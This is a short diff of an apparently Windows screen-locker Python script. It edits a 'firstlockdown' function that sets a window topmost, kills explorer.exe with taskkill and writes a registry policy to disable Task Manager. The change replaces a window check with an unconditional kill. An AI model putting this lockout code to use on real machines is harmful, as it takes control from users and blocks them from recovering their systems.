@@ -1,4 +1,4 @@
-import win32gui, win32con, win32ui, os, sys, winreg
+import win32gui, win32con, os, sys, winreg
 
 # Set Registry Values for disabling Task Manager
 registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -21,9 +21,11 @@ def firstlockdown():
             win32con.SWP_NOMOVE | win32con.SWP_NOSIZE,
         )
 
-        # Kill Explorer, if Explorer is running
-        if win32ui.FindWindow(None, "Explorer"):
+        # Attempt to kill Explorer
+        try:
             os.system("taskkill /f /im explorer.exe")
+        except:
+            pass
 
         # Edit Registry to disable Task Manager
         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
